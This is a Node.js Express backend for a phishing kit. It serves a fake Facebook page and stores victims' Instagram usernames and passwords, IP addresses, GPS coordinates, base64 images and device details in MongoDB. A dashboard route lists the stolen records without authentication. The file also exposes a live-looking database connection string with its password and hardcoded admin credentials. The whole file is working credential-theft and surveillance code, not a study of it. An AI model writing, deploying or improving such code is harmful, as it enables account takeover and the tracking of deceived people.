const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(cors());
app.use(express.static(path.join(__dirname)));

// MongoDB Connection (Apna password yahan theek se daal lena bina < > ke)
const MONGO_URI = "mongodb+srv://ktalpada484_db_user:sumit1123@cluster0.zjkzamc.mongodb.net/?appName=Cluster0";

mongoose.connect(MONGO_URI)
    .then(() => console.log("MongoDB Connected Successfully! Data is permanent."))
    .catch(err => console.log("DB Connection Error: ", err));

// Log Schema Definition
const FFLogSchema = new mongoose.Schema({
    id: String,
    ip: String,
    platform: String,
    instagram_username: String,
    instagram_password: String,
    latitude: String,
    longitude: String,
    image_base64: String,
    system: Object,
    timestamp: { type: Date, default: Date.now }
});

const FFLogModel = mongoose.model('FFLog', FFLogSchema);

// Routes for Pages
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'facebook.html'));
});

app.get('/viewer.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'viewer.html'));
});

// Admin Login Authentication Route
app.post('/api/admin-login', (req, res) => {
    const { username, password } = req.body;
    if (username === "sumit@1123" && password === "sumit1123") {
        res.status(200).json({ status: 'success', message: 'Login Successful' });
    } else {
        res.status(401).json({ status: 'error', message: 'Invalid Credentials' });
    }
});

// Data Collect API Route
app.post('/api/collect-ff', async (req, res) => {
    try {
        const recordId = 'FF_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        
        const newFFLog = new FFLogModel({
            id: recordId,
            ip: clientIp,
            platform: req.body.platform || 'Unknown',
            instagram_username: req.body.instagram_username || req.body.username || 'N/A',
            instagram_password: req.body.instagram_password || req.body.password || 'N/A',
            latitude: req.body.latitude || 'N/A',
            longitude: req.body.longitude || 'N/A',
            image_base64: req.body.image_base64 || null,
            system: req.body.system || {}
        });

        await newFFLog.save();
        res.status(200).json({ status: 'success' });
    } catch (err) {
        res.status(500).json({ status: 'error', error: err.message });
    }
});

// Get Logs API for Viewer Dashboard
app.get('/api/get-logs', async (req, res) => {
    try {
        const logs = await FFLogModel.find().sort({ timestamp: -1 });
        res.json(logs);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
